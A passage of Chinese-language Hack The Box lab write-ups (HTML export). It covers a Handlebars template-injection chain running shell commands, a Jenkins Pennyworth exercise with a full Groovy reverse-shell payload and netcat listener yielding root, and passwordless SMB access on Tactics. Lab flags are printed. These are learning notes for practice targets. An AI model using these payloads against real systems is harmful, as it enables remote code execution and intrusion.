+</p><p id="cfc58090-600b-483a-9aeb-e6a41d256f1b" class="">用 execSync 會比較方便且穩定</p><pre id="9f6df7df-efd2-40bb-9bac-666000a0b6b0" class="code code-wrap"><code>require(&#x27;child_process&#x27;).execSync(&quot;whoami&quot;).toString()</code></pre><pre id="66c7c388-76a1-4c60-852c-eafbd3680a7e" class="code code-wrap"><code>{{#with &quot;s&quot; as |string|}}
+  {{#with &quot;e&quot;}}
+    {{#with split as |conslist|}}
+      {{this.pop}}
+      {{this.push (lookup string.sub &quot;constructor&quot;)}}
+      {{this.pop}}
+      {{#with string.split as |codelist|}}
+        {{this.pop}}
+        {{this.push &quot;return process.mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;whoami&#x27;);&quot;}}
+        {{this.pop}}
+        {{#each conslist}}
+          {{#with (string.sub.apply 0 codelist)}}
+            {{this}}
+          {{/with}}
+        {{/each}}
+      {{/with}}
+    {{/with}}
+  {{/with}}
+{{/with}}</code></pre><figure id="9a006bf7-9802-4081-a42b-581dbabda79c" class="image"><a href="HTB%20writeu%20673ee/Untitled%2049.png"><img style="width:2538px" src="HTB%20writeu%20673ee/Untitled%2049.png"/></a></figure><pre id="7ef29c7c-c499-4281-963e-c88ce61ae0a6" class="code code-wrap"><code>We will contact you at:                e       2       [object Object]                function Function() { [native code] }         2         [object Object]                                 root</code></pre><p id="9072e7d3-2ea6-4423-9f6b-1a509e2fd6fc" class="">
+</p><p id="619b82de-f660-4ee5-9767-4b1dc1cce5f6" class="">在 template engine 的場境不需要加上 <code>toString()</code> 就能正常顯示內容</p><figure id="88138c9a-169b-468d-9fc1-f47f1bf63315" class="image"><a href="HTB%20writeu%20673ee/Untitled%2050.png"><img style="width:1132px" src="HTB%20writeu%20673ee/Untitled%2050.png"/></a></figure><pre id="4bad898a-c903-4302-9bb0-8b1280efb157" class="code code-wrap"><code>&gt; require(&#x27;child_process&#x27;).execSync(&quot;whoami&quot;)
+&lt;Buffer 75 73 65 72 0a&gt;
+&gt; require(&#x27;child_process&#x27;).execSync(&quot;whoami&quot;).toString()
+&#x27;user\n&#x27;
+&gt;</code></pre><p id="c0497ad1-0899-4f4c-9b65-5a1114ca2dc2" class="">
+</p><pre id="230cfdef-a873-4465-9365-d7b26fe329f7" class="code code-wrap"><code>{{#with &quot;s&quot; as |string|}}
+  {{#with &quot;e&quot;}}
+    {{#with split as |conslist|}}
+      {{this.pop}}
+      {{this.push (lookup string.sub &quot;constructor&quot;)}}
+      {{this.pop}}
+      {{#with string.split as |codelist|}}
+        {{this.pop}}
+        {{this.push &quot;return process.mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;cat ~/flag.txt&#x27;);&quot;}}
+        {{this.pop}}
+        {{#each conslist}}
+          {{#with (string.sub.apply 0 codelist)}}
+            {{this}}
+          {{/with}}
+        {{/each}}
+      {{/with}}
+    {{/with}}
+  {{/with}}
+{{/with}}</code></pre><figure id="d9cd66d6-d636-4c21-8f64-8b66fad390a7" class="image"><a href="HTB%20writeu%20673ee/Untitled%2051.png"><img style="width:2546px" src="HTB%20writeu%20673ee/Untitled%2051.png"/></a></figure><pre id="840f1e32-70dc-4418-aa3d-c23cd3edf1d9" class="code code-wrap"><code>We will contact you at:                e       2       [object Object]                function Function() { [native code] }         2         [object Object]                                 6b258d726d287462d60c103d0142a81c</code></pre><h3 id="11af5bcc-eafe-48e5-a4e2-d8a56753769f" class="">flag</h3><pre id="30592bf8-474f-44a8-a018-09bdd16518b0" class="code code-wrap"><code>6b258d726d287462d60c103d0142a81c</code></pre><h3 id="ef068357-18bd-41fd-ad06-25754174cf6f" class="">Ref</h3><p id="b6848799-5152-448a-87ee-c7004f4ffa2c" class="">SSTI (Server Side Template Injection) - HackTricks
+<a href="https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection#handlebars-nodejs">https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection#handlebars-nodejs</a>
+The Secret Parameter, LFR, and Potential RCE in NodeJS Apps
+<a href="https://blog.shoebpatel.com/2021/01/23/The-Secret-Parameter-LFR-and-Potential-RCE-in-NodeJS-Apps/">https://blog.shoebpatel.com/2021/01/23/The-Secret-Parameter-LFR-and-Potential-RCE-in-NodeJS-Apps/</a></p><p id="df3b0b0b-fbf6-4594-9ee7-e507a2a85f65" class="">
+</p><hr id="6227105d-91ef-4c24-bd79-9742ed3ffa76"/><h1 id="834a29f0-920b-4c8c-99e6-45e1b4d393a3" class="">🤵🏻‍♂️ Pennyworth (Weak Password)</h1><blockquote id="96ed7fa1-a60e-4b02-b25a-115d0c63c243" class="">it is vital that you save them for later in a well-organized bookmark folder for quick access. It is highly encouraged to use well-established research in your professional activities</blockquote><p id="e2527215-db29-492e-a63e-dce5e1c9ff2f" class="">
+</p><p id="62984a9b-47e1-466f-8967-36ff69aa9458" class="">這題主要是讓你體驗在 jenkins script console 執行 reverse shell 的過程．比較需要運氣的地方是要能夠登入或利用漏洞進入 jenkins 的管理介面．</p><p id="5168e7c8-604f-49ea-8d39-b8431910819b" class="">類似的場景還有 Gitlab 這類能夠執行 CI/CD piplines, webhook 或指令的服務，因此算是蠻好的目標</p><h2 id="e0cfaa21-6884-4ac5-81e8-3ddfa89261cc" class="">Questions</h2><h3 id="26fbf341-2d42-4d62-8d3e-e97afa28dcd6" class="">What do the three letters in CIA, referring to the CIA triad in cybersecurity, stand for?: -&gt; <code>confidentiality, integrity, availability</code></h3><p id="1c8c526d-1669-4abf-bf16-19c8152e5032" class="">
+</p><p id="45b4f623-7175-4f2f-9581-4426251a7ddd" class="">What is the version of the service running on port 8080?: -&gt; Jetty 9.4.39.v20210325</p><p id="1fbc9aa4-fd75-42ef-b83d-411514315543" class="">
+</p><p id="e6ad6a52-734b-411b-a033-4f7cec65c412" class="">What version of Jenkins is running on the target?: -&gt; 2.289.1</p><p id="2202d131-87fe-434c-a0fc-c99e22be158d" class="">
+</p><h3 id="cfd0a309-a19e-4c09-b74f-1c6d28b99e09" class="">What type of script is accepted as input on the Jenkins Script Console?: -&gt; Groovy</h3><p id="76bbb4f5-c6b3-4b70-99b4-26b41e1712cc" class="">
+</p><p id="3634f64f-0fb7-4237-8189-150ee4b3e0a3" class="">What would the \&quot;String cmd\&quot; variable from the Groovy Script snippet be equal to if the Target VM was running Windows?: -&gt; cmd.exe
+
+What is a different command than \&quot;ip a\&quot; we could use to display our network interfaces&#x27; information on Linux?: -&gt; ifconfig</p><p id="bb444f38-8569-4a9c-a127-df6e66084881" class="">
+</p><h3 id="5fe8872b-faed-4bcb-bbc9-8f322ee86c93" class="">What switch should we use with netcat for it to use UDP transport mode?: -&gt; -u</h3><p id="1c8c49d9-be07-4f38-a309-0c254458b028" class="">
+</p><h3 id="30581699-59af-41e8-901d-dfa46583425a" class="">What is the term used to describe making a target host initiate a connection back to the attacker host?: -&gt; <code>reverse shell</code></h3><p id="7e920831-ed40-4602-9380-345a00dd9020" class="">
+</p><h2 id="4cc85512-c980-4765-88f8-c441e758a7ea" class="">Lab</h2><pre id="0ac753bf-fca5-427f-9208-bcebdb4291ce" class="code code-wrap"><code>nmap -A 10.129.75.150</code></pre><pre id="b2668fa1-3637-485f-a704-912fc8ba6985" class="code code-wrap"><code>Starting Nmap 7.92 ( https://nmap.org ) at 2022-03-03 15:57 CST
+Nmap scan report for 10.129.75.150
+Host is up (0.27s latency).
+Not shown: 996 closed tcp ports (conn-refused)
+PORT      STATE    SERVICE  VERSION
+1011/tcp  filtered unknown
+5800/tcp  filtered vnc-http
+8080/tcp  open     http     Jetty 9.4.39.v20210325
+|_http-server-header: Jetty(9.4.39.v20210325)
+|_http-title: Site doesn&#x27;t have a title (text/html;charset=utf-8).
+| http-robots.txt: 1 disallowed entry 
+|_/
+50500/tcp filtered unknown</code></pre><p id="87f53531-4a44-46a8-ac46-89772e4dc7b9" class="">
+</p><pre id="0d3eec1b-00f9-4155-9509-6d7ea190417d" class="code code-wrap"><code>http://10.129.75.150:8080</code></pre><pre id="d578512a-8638-4ff3-af21-d8377033ae00" class="code code-wrap"><code>http://10.129.75.150:8080/login?from=%2F</code></pre><figure id="d88011d7-ef46-4453-a0af-722e9ae279f5" class="image"><a href="HTB%20writeu%20673ee/Untitled%2052.png"><img style="width:432px" src="HTB%20writeu%20673ee/Untitled%2052.png"/></a></figure><figure id="6eaa586a-2cb5-42ec-a91a-b316272f29e9" class="image"><a href="HTB%20writeu%20673ee/Untitled%2053.png"><img style="width:2350px" src="HTB%20writeu%20673ee/Untitled%2053.png"/></a></figure><p id="e9d167a5-8d1f-4e64-967d-c4a7e590e9c9" class="">
+</p><figure id="fb8a0bcf-bfae-4d0f-9a9c-b681a5edad14" class="image"><a href="HTB%20writeu%20673ee/Untitled%2054.png"><img style="width:2324px" src="HTB%20writeu%20673ee/Untitled%2054.png"/></a></figure><figure id="ae5be74e-7c70-4990-bd37-b4a153d8709b" class="image"><a href="HTB%20writeu%20673ee/Untitled%2055.png"><img style="width:2296px" src="HTB%20writeu%20673ee/Untitled%2055.png"/></a></figure><h3 id="0471fce9-d09e-4d3b-8930-df587b3848cb" class="">Script Console</h3><p id="71b7ad79-173f-493b-b588-b6b166826650" class="">這邊就是要我們執行惡意程式的地方</p><pre id="949aa838-3b41-4803-88b3-903883567e31" class="code code-wrap"><code>http://10.129.75.150:8080/script</code></pre><p id="ee135c53-adb5-4107-8228-0bd550db0ef7" class="">
+</p><h3 id="adbc811b-d6f2-42d4-ab32-c297077ff936" class="">nc</h3><p id="ab9ebcd5-26dd-48f6-a98a-db584565a9cc" class="">要先準備好我們的 nc server，負責跟惡意程式溝通</p><pre id="79cf783d-1d43-4353-98e1-4ee4900ecb49" class="code code-wrap"><code>nc -vnlp 8000</code></pre><h3 id="a586b1c9-bb15-480c-8043-c9b2ddc73873" class="">nc options to use:</h3><pre id="126af9b3-a7df-44f9-b415-84d8f92d7c4a" class="code code-wrap"><code>l : Listening mode.
+v : Verbose mode. Displays status messages in more detail.
+n : Numeric-only IP address. No hostname resolution. DNS is not being used.
+p : Port. Use to specify a particular port for listening.</code></pre><p id="3012505e-0b78-4af7-87f2-d57a1f07e7a3" class="">
+</p><h3 id="c10da9ad-5621-4066-913e-589fa052f19b" class="">Reverse Shell Generator</h3><p id="8e08bb69-f9cd-413f-a789-9bb9a4b39eb2" class="">直接從官方 writeup 上複製貼上範例可能會 syntax error</p><p id="ae336cab-a26a-4041-ae70-211dbb2232cf" class="">可以善用 Shell Generator 幫你產生 nc 指令和 reverse shell </p><figure id="22335c18-c90e-49e2-a7e8-692bf4927587" class="image"><a href="HTB%20writeu%20673ee/Untitled%2056.png"><img style="width:2792px" src="HTB%20writeu%20673ee/Untitled%2056.png"/></a></figure><p id="3af207f8-22c3-4f33-966b-1fc13716a2af" class="">Online - Reverse Shell Generator
+<a href="https://www.revshells.com/">https://www.revshells.com/</a></p><p id="833a1a45-efa9-44d0-a3fb-61f56ba47a8c" class="">
+</p><p id="6becc255-f0aa-4663-a5eb-812bc61ebc1e" class="">使用 shell generator 產生好的 shell code</p><figure id="53164f5c-cca8-4608-989b-a65c98796fac" class="image"><a href="HTB%20writeu%20673ee/Untitled%2057.png"><img style="width:3546px" src="HTB%20writeu%20673ee/Untitled%2057.png"/></a></figure><h3 id="b2e3e01c-25cd-49c5-a781-448fe68b3a8f" class="">reverse shell payload for Groovy</h3><pre id="fa67ca45-04b5-430e-a112-e6b873c2c011" class="code code-wrap"><code>String host=&quot;{YOUR_IP}&quot;;
+int port=8000;
+String cmd=&quot;/bin/bash&quot;;
+Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();
+Socket s=new Socket(host,port);
+InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();
+OutputStream po=p.getOutputStream(),so=s.getOutputStream();
+while(!s.isClosed()){while(pi.available()&gt;0)so.write(pi.read());
+while(pe.available()&gt;0)so.write(pe.read());
+while(si.available()&gt;0)po.write(si.read());
+so.flush();
+po.flush();
+Thread.sleep(50);
+try {p.exitValue();
+break;
+}catch (Exception e){}};
+p.destroy();
+s.close();</code></pre><p id="6382d684-1409-4ecf-801e-aac0b5f8add2" class="">關於更多不同的 reverse shell 可參考: </p><p id="454b1d7d-28e5-42e8-b105-afefb4e266ca" class="">
+</p><p id="5d45f46b-92dd-4c89-9fed-04bc04437d07" class="">PayloadsAllTheThings/Reverse Shell <a href="http://cheatsheet.md/">Cheatsheet.md</a> at master · swisskyrepo/PayloadsAllTheThings
+<a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md">https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology and Resources/Reverse Shell Cheatsheet.md</a></p><p id="aaf18c77-a91f-4cd7-8d94-ebc251931de8" class="">
+</p><p id="c2bd1547-19e7-48a1-bb83-60bee5b8d1b9" class="">
+</p><p id="99f5b923-4b1f-45b6-80c0-79b57512172b" class="">基本上你可能會改的參數只有這些:</p><pre id="dfc6c8ca-ba7c-4183-8916-afe7206b7c6e" class="code code-wrap"><code>String host=&quot;{your_IP}&quot;;  # 因為是讓目標連回去你(攻擊方)的 server，所以是填入你的 ip
+int port=8000;
+String cmd=&quot;/bin/bash&quot;;   # 如果對方是用 windows 主機，就必須換成 cmd.exe or powershell</code></pre><pre id="aee6172a-3a61-4d8e-bfb6-3e29d139e442" class="code code-wrap"><code>pipeline {
+  agent any
+  stages {
+    stage(&#x27;Unit Test&#x27;) { 
+      steps {
+        sh &#x27;mvn clean test&#x27;
+      }
+    }
+    stage(&#x27;Deploy Standalone&#x27;) { 
+      steps {
+        sh &#x27;mvn deploy -P standalone&#x27;
+      }
+    }
+    stage(&#x27;Deploy AnyPoint&#x27;) { 
+      environment {
+        ANYPOINT_CREDENTIALS = credentials(&#x27;anypoint.credentials&#x27;) 
+      }
+      steps {
+        sh &#x27;mvn deploy -P arm -Darm.target.name=local-4.0.0-ee -Danypoint.username=${ANYPOINT_CREDENTIALS_USR}  -Danypoint.password=${ANYPOINT_CREDENTIALS_PSW}&#x27; 
+      }
+    }
+    stage(&#x27;Deploy CloudHub&#x27;) { 
+      environment {
+        ANYPOINT_CREDENTIALS = credentials(&#x27;anypoint.credentials&#x27;)
+      }
+      steps {
+        sh &#x27;mvn deploy -P cloudhub -Dmule.version=4.0.0 -Danypoint.username=${ANYPOINT_CREDENTIALS_USR} -Danypoint.password=${ANYPOINT_CREDENTIALS_PSW}&#x27; 
+      }
+    }
+  }
+}</code></pre><h3 id="2b7e42e9-68c9-4041-a7e9-b282ccf3d09d" class="">Connect from target to our host</h3><figure id="860e5cfd-6794-4770-bd74-2b0873ad29ff" class="image"><a href="HTB%20writeu%20673ee/Untitled%2058.png"><img style="width:3580px" src="HTB%20writeu%20673ee/Untitled%2058.png"/></a></figure><p id="caf02bdd-1d24-4c0f-b219-e6f78d16322b" class="">
+</p><figure id="9e883cd1-90e6-486b-bc8b-c2c6a82acf0c" class="image"><a href="HTB%20writeu%20673ee/Untitled%2059.png"><img style="width:1793px" src="HTB%20writeu%20673ee/Untitled%2059.png"/></a></figure><pre id="3c0d0bb2-fcbc-4b8d-aebd-635517ceea17" class="code code-wrap"><code>nc -vnlp 8000
+listening on [any] 8000 ...
+connect to [10.10.14.37] from (UNKNOWN) [10.129.75.150] 44200</code></pre><p id="f8fd21b1-f8e0-4bc0-898f-c311b1f0f141" class="">
+</p><figure id="a27b9424-dbd2-433a-93f5-a45f7ab86e1f" class="image"><a href="HTB%20writeu%20673ee/Untitled%2060.png"><img style="width:631px" src="HTB%20writeu%20673ee/Untitled%2060.png"/></a></figure><p id="bde1ee20-508b-4d9b-b16b-80684c144045" class="">
+</p><pre id="972a4338-cc08-484a-a8ef-4dad63068aa5" class="code code-wrap"><code>nc -vnlp 8000
+listening on [any] 8000 ...
+connect to [10.10.14.37] from (UNKNOWN) [10.129.75.150] 44244
+whoami
+root</code></pre><pre id="f412c59f-5916-4c29-b7c1-deebaeb89def" class="code code-wrap"><code>cd
+ls
+cat flag.txt
+9cdfb439c7876e703e307864c9167a15</code></pre><figure id="d1d68505-0ffc-459d-b8b0-61526eab40c8" class="image"><a href="HTB%20writeu%20673ee/Untitled%2061.png"><img style="width:1793px" src="HTB%20writeu%20673ee/Untitled%2061.png"/></a></figure><h3 id="d8cd4bde-9d12-46d5-b3a3-5a187f8a7b87" class="">flag</h3><pre id="b3dea837-750e-42b6-a03d-40ce476a3856" class="code code-wrap"><code>9cdfb439c7876e703e307864c9167a15</code></pre><hr id="4ad2d6b5-3e40-4dc6-9945-df4d73abc321"/><h1 id="d48f6d42-dd70-4a58-8940-c987c37f4764" class="">🏈  Tactics (SMB)</h1><p id="3fd2bb4c-d4c7-4a66-b1bf-e4d8f5e0cc85" class="">這次也是練習 SMB，基本上就是熟悉 nmap 和 smbclient 指令和看你要不要用 PSexec.py</p><pre id="6b472c12-8132-46a4-aa93-4f28d6a1198b" class="code code-wrap"><code>10.129.77.79</code></pre><h3 id="bcc8830b-4fe7-4da7-aa41-7cf13b7e3f2c" class="">recon</h3><pre id="cd3372ad-6bb7-4a6c-9feb-199b23d766a1" class="code code-wrap"><code>nmap -A 10.129.77.79</code></pre><pre id="84e40183-d9e9-46e2-a2d2-81d205fda3e0" class="code code-wrap"><code>Nmap scan report for 10.129.77.56
+Host is up (0.28s latency).
+Not shown: 997 filtered tcp ports (no-response)
+PORT    STATE SERVICE       VERSION
+135/tcp open  msrpc         Microsoft Windows RPC
+139/tcp open  netbios-ssn   Microsoft Windows netbios-ssn
+445/tcp open  microsoft-ds?
+Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
+No OS matches for host
+Network Distance: 2 hops
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+|_clock-skew: 11m38s
+| smb2-time: 
+|   date: 2022-03-05T03:08:24
+|_  start_date: N/A
+| smb2-security-mode: 
+|   3.1.1: 
+|_    Message signing enabled but not required
+
+TRACEROUTE (using port 445/tcp)
+HOP RTT       ADDRESS
+1   283.34 ms 10.10.14.1
+2   283.44 ms 10.129.77.79
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 87.68 seconds</code></pre><p id="fc6e58b1-1fd6-4c1d-8860-5513c85f100e" class="">👉  Windows 2000 之後就有使用 port 455 for SMB</p><p id="73d4277a-aa8a-496b-9b74-52aedb808b8c" class="">
+</p><h3 id="a5b75b7b-85d2-464b-9cbf-676d43b8fe8d" class="">using smbclient</h3><p id="3eb96b98-8ce5-4b28-a635-fd18474ddd4d" class="">基本上一定要 try try 的預設帳號就是 Administrator，因為題目是模擬 misconfiguration，所以沒有設定密碼，輸入密碼時直接按 enter 繼續</p><h3 id="6f193bdd-1294-4f9c-8edf-8fb8fd094f24" class="">list</h3><pre id="e3d6eb83-d7c1-49c5-8e10-cd07fea6d81c" class="code code-wrap"><code>smbclient -U Administrator -L 10.129.77.79</code></pre><pre id="a79992be-ade6-4da6-bbb4-dad4195c3fb9" class="code code-wrap"><code>smbclient -U Administrator -L 10.129.77.79
+Enter WORKGROUP\Administrator&#x27;s password: 
+
+	Sharename       Type      Comment
+	---------       ----      -------
+	ADMIN$          Disk      Remote Admin
+	C$              Disk      Default share
+	IPC$            IPC       Remote IPC
+SMB1 disabled -- no workgroup available</code></pre><p id="e831462b-3d19-40f2-a8cc-e7725a43748d" class="">
+</p><h3 id="76fc796b-6076-4f62-8c4f-1fbf8e8ecff2" class="">connect to shared folder, try to find flag</h3><pre id="eda7ba3d-7584-4175-925b-7b56ab8fa5c7" class="code code-wrap"><code>smbclient \\\\10.129.77.79\\ADMIN$ -U Administrator</code></pre><pre id="88e47274-6100-408d-9786-e0aabb370c03" class="code code-wrap"><code>smb: \&gt; help</code></pre><pre id="8a4208e4-90af-4359-bce9-0641d7dc0802" class="code code-wrap"><code>smb: \&gt; ls</code></pre><figure id="e4b6fc94-f272-46db-829e-3876a3b7ea7e" class="image"><a href="HTB%20writeu%20673ee/Untitled%2062.png"><img style="width:1512px" src="HTB%20writeu%20673ee/Untitled%2062.png"/></a></figure><p id="c12ba4dc-50d0-4aae-be26-4e4ec43511bc" class="">too much thins, hum...</p><p id="46354d94-8218-46f9-9b51-8f2ace8a9970" class="">
+</p><p id="707e44de-8919-4f93-920d-3456f63a6917" class="">try to access C$ folder</p><pre id="971e92c6-6845-446d-8a99-97fa1ef67cdb" class="code code-wrap"><code>smbclient \\\\10.129.77.79\\C$ -U Administrator</code></pre><pre id="969dec06-c758-401f-9d31-3e846af03d2b" class="code code-wrap"><code>cd Users\Administrator\Desktop\</code></pre><pre id="63fe7c6b-4cff-4f20-a78e-358120d358bc" class="code code-wrap"><code>cd dir</code></pre><pre id="77a19835-a7d8-456d-bb8f-604eb1f86c6a" class="code code-wrap"><code>get flag.txt</code></pre><figure id="1252f76f-f495-4f86-adc7-73e811851c89" class="image"><a href="HTB%20writeu%20673ee/Untitled%2063.png"><img style="width:1221px" src="HTB%20writeu%20673ee/Untitled%2063.png"/></a></figure><pre id="87d7e031-0cf6-4b4b-8185-f9648e9a4f37" class="code code-wrap"><code>exit</code></pre><pre id="8f8d1392-b580-400b-8ccf-c89261fda0c2" class="code code-wrap"><code>cat flag.txt</code></pre><h3 id="fa87b673-bcd8-4dd8-9d4b-60ca594e719c" class="">flag</h3><pre id="f303fb41-3928-4e38-bd31-1000605dbabb" class="code code-wrap"><code>f751c19eda8f61ce81827e6930a1f40c</code></pre><p id="f64a14d7-2034-4bd4-b1f4-06c206aeb10e" class="">
+</p><p id="4cfb89d7-d0aa-4536-b401-71f59af520b5" class="">官方 writeup 有提到 <code>impacket</code> repo 裡的 <code>PSexec.py</code> 這個工具，也可以用來當作 interactive shell，可以自行使用</p><p id="1bef9178-1fd0-428f-bc7e-401badfdedf2" class="">impacket/psexec.py at master · SecureAuthCorp/impacket
+<a href="https://github.com/SecureAuthCorp/impacket/blob/master/examples/psexec.py">https://github.com/SecureAuthCorp/impacket/blob/master/examples/psexec.py</a></p><p id="76fb43d3-5f7c-4d6a-a9ae-6e32fe7b802d" class="">
+</p><hr id="0327982f-dc47-4a19-a01f-960f3038080e"/><h3 id="648c3c88-84fd-4ae5-9521-1a3061d5f32c" class="">Ref</h3><p id="4f80b807-43fb-4a08-9fc8-9ff802b540b0" class="">Session Layer in OSI Model - Studyopedia
+<a href="https://studyopedia.com/computer-networks/session-layer-in-osi-model/">https://studyopedia.com/computer-networks/session-layer-in-osi-model/</a>
+The OSI Model Layers from Physical to Application
+<a href="https://www.lifewire.com/layers-of-the-osi-model-illustrated-818017">https://www.lifewire.com/layers-of-the-osi-model-illustrated-818017</a></p><p id="af633763-9b14-4faf-82b7-ca1218a5a57f" class="">SecureAuthCorp/impacket: Impacket is a collection of Python classes for working with network protocols.
+<a href="https://github.com/SecureAuthCorp/impacket">https://github.com/SecureAuthCorp/impacket</a></p><p id="81581d93-7fa1-4870-bfcf-5654d2c3f18a" class="">
+</p><h3 id="8c4b66ec-ee91-4305-82f8-b0862d8d8517" class="">tldr nmap</h3><p id="c81a183a-37fc-46fa-a33d-d840fc806bf1" class="">在真實環境你應該會很常使用 <code>-Pn</code></p><pre id="f3bc645a-662e-467c-af2b-73376c4a3550" class="code code-wrap"><code>nmap -Pn -sC &lt;host&gt;</code></pre><ul id="b83bd56a-0d73-40b0-af4a-af00fd43bd89" class="bulleted-list"><li style="list-style-type:disc"><code>Pn : Treat all hosts as online -- skip host discovery
+-sC : Equivalent to --script=default</code></li></ul><pre id="6487db37-5953-470c-a913-78d1fb1c3677" class="code code-wrap"><code>- Check if an IP address is up, and guess the remote host&#x27;s operating system:
+   nmap -O {{ip_or_hostname}}
+
+ - Try to determine whether the specified hosts are up and what their names are:
+   nmap -sn {{ip_or_hostname}} {{optional_another_address}}
+
+ - Like above, but also run a default 1000-port TCP scan if host seems up:
+   nmap {{ip_or_hostname}} {{optional_another_address}}
+
+ - Also enable scripts, service detection, OS fingerprinting and traceroute:
+   nmap -A {{address_or_addresses}}
+
+ - Assume good network connection and speed up execution:
+   nmap -T4 {{address_or_addresses}}
+
+ - Scan a specific list of ports (use -p- for all ports 1-65535):
+   nmap -p {{port1,port2,…,portN}} {{address_or_addresses}}
+
+ - Perform TCP and UDP scanning (use -sU for UDP only, -sZ for SCTP, -sO for IP):
+   nmap -sSU {{address_or_addresses}}
+
+ - Perform full port, service, version detection scan with all default NSE scripts active against a host to determine weaknesses and info:
+   nmap -sC -sV {{address_or_addresses}}</code></pre><p id="399dd93b-e77f-4fa9-ab44-26c75b6bcc49" class="">
+</p><h3 id="6dc7c239-935c-45a5-9489-db84353e18a0" class="">tldr smbclient</h3><pre id="5f2c3ceb-04fa-4b94-88e8-c2f54e57facd" class="code code-wrap"><code>smbclient
+FTP-like client to access SMB/CIFS resources on servers.
+
+ - Connect to a share (user will be prompted for password; exit to quit the session):
+   smbclient {{//server/share}}
+
+ - Connect with a different username:
+   smbclient {{//server/share}} --user {{username}}
+
+ - Connect with a different workgroup:
+   smbclient {{//server/share}} --workgroup {{domain}} --user {{username}}
+
+ - Connect with a username and password:
+   smbclient {{//server/share}} --user {{username%password}}
+
+ - Download a file from the server:
+   smbclient {{//server/share}} --directory {{path/to/directory}} --command &quot;get {{file.txt}}&quot;
+
+ - Upload a file to the server:
+   smbclient {{//server/share}} --directory {{path/to/directory}} --command &quot;put {{file.txt}}&quot;</code></pre><hr id="9d11a127-3776-46ae-9574-8b10944e5c61"/><h1 id="a77f84ca-c332-483f-9aa9-2ecd732549bd" class="">Ref</h1><h3 id="fc7d6311-bb2a-4551-b882-2fe0eee69b77" class="">🔖 bookmarks</h3><ul id="b6b4215a-c41d-46dc-a602-590f5c51791e" class="bulleted-list"><li style="list-style-type:disc"><a href="https://book.hacktricks.xyz/pentesting/pentesting-web/jenkins#code-execution">Jenkins - HackTricks</a></li></ul><ul id="82259379-9cd0-47cf-b798-f2375178e825" class="bulleted-list"><li style="list-style-type:disc"><a href="https://github.com/gquere/pwn_jenkins">gquere/pwn_jenkins: Notes about attacking Jenkins servers</a></li></ul><ul id="8e8a4ffb-78d3-49e1-a8bb-46bac8e50ec9" class="bulleted-list"><li style="list-style-type:disc"><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md">PayloadsAllTheThings/Reverse Shell Cheatsheet.md at master · swisskyrepo/PayloadsAllTheThings</a></li></ul><ul id="8f1afdf5-98f4-464f-ad91-f45cf1c0e2f5" class="bulleted-list"><li style="list-style-type:disc"><a href="https://www.revshells.com/">Online - Reverse Shell Generator</a></li></ul><ul id="fb60264b-30bf-4c1a-9940-88925fa481b3" class="bulleted-list"><li style="list-style-type:disc"><a href="https://github.com/danielmiessler/SecLists">danielmiessler/SecLists: SecLists is the security tester&#x27;s companion. It&#x27;s a collection of multiple types of lists used during security assessments, collected in one place. List types include usernames, passwords, URLs, sensitive data patterns, fuzzing payloads, web shells, and many more.</a></li></ul><hr id="03d685b7-9daf-4c64-9bb4-eb5949d35386"/><h3 id="b3c26246-e59b-4bfc-a265-f3d3e16ab12e" class="">others</h3><ul id="9ebcba19-a385-4eb7-a88c-4db00f1d6392" class="bulleted-list"><li style="list-style-type:disc"><a href="https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection#handlebars-nodejs">SSTI (Server Side Template Injection) - HackTricks</a></li></ul><ul id="2ebb1b27-8eb5-4810-8197-7d40dc3f29ec" class="bulleted-list"><li style="list-style-type:disc"><a href="https://blog.shoebpatel.com/2021/01/23/The-Secret-Parameter-LFR-and-Potential-RCE-in-NodeJS-Apps/">The Secret Parameter, LFR, and Potential RCE in NodeJS Apps</a></li></ul><ul id="0d3ef271-a5e7-46a5-b117-aa74dd2c30a9" class="bulleted-list"><li style="list-style-type:disc"><a href="http://mahmoudsec.blogspot.com/2019/04/handlebars-template-injection-and-rce.html">Handlebars template injection and RCE in a Shopify app</a></li></ul><ul id="cb0905e6-631b-4673-a9cb-31910cdbdb98" class="bulleted-list"><li style="list-style-type:disc"><a href="https://docs.groovy-lang.org/latest/html/documentation/">Groovy Language Documentation</a></li></ul><ul id="80ea4574-613a-47cd-97d4-08d1c8f6135c" class="bulleted-list"><li style="list-style-type:disc"><a href="https://everythingwhat.com/what-is-the-default-password-for-jenkins-user">What is the default password for Jenkins user? | EveryThingWhat.com</a></li></ul><ul id="8cbe6ccc-f29e-453e-9b46-d0e7ce90bda8" class="bulleted-list"><li style="list-style-type:disc"><a href="https://intellipaat.com/community/26950/default-credentials-for-jenkins-after-installation-windows-10-jenkins-default-password">Default credentials for Jenkins after installation(Windows 10) -Jenkins Default Password - Intellipaat Community</a></li></ul><ul id="278e5c65-2643-439a-87b5-10b5a88e1acb" class="bulleted-list"><li style="list-style-type:disc"><a href="https://zh.wikipedia.org/wiki/%E5%85%AC%E5%85%B1%E6%BC%8F%E6%B4%9E%E5%92%8C%E6%9A%B4%E9%9C%B2">公共漏洞和暴露 - 維基百科，自由的百科全書</a></li></ul><ul id="5b392684-232f-4c42-9cb5-fe5b65e23a95" class="bulleted-list"><li style="list-style-type:disc"><a href="https://www.f5.com/labs/articles/education/what-is-the-cia-triad">What Is The CIA Triad?</a></li></ul><ul id="0ffe78db-a34f-4a5f-a043-f030ce05d293" class="bulleted-list"><li style="list-style-type:disc"><a href="https://zh.wikipedia.org/wiki/Groovy">Groovy - 維基百科，自由的百科全書</a></li></ul><ul id="38ec639c-dbe2-4440-9b26-eaec88626e3c" class="bulleted-list"><li style="list-style-type:disc"><a href="https://en.wikipedia.org/wiki/Netcat">netcat - 